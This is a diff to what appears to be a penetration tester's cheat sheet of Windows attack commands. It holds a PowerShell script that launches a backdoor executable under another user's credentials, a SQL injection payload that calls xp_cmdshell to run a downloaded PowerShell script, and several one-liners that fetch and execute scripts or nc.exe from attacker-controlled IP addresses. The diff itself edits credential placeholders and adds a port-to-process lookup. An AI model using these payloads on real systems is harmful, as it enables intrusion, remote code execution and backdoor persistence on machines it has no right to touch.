@@ -84,8 +84,8 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 Run le as another user with powershell.
 
 ```bash
-echo $username = '<username>' > runas.ps1
-echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
+echo $username = '$target' > runas.ps1
+echo $securePassword = ConvertTo-SecureString '$targetPass' -AsPlainText -Force >> runas.ps1
 echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
 echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
 ```
@@ -96,6 +96,8 @@ admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).Do
 iex(iwr -uri 192.168.45.178:8000/transfer_files.ps1 -usebasicparsing)
 iex(iwr -uri 10.10.14.8:8000/transfer_files.ps1 -usebasicparsing)
 curl 10.10.14.8:8000/nc.exe -o nc.exe
+
+Get-NetTCPConnection -LocalPort 49681 | Select-Object -Property OwningProcess | Get-Process
 
 iex(iwr -uri 192.168.49.140:8000/nc.exe -usebasicparsing)
 transfer_files.ps1
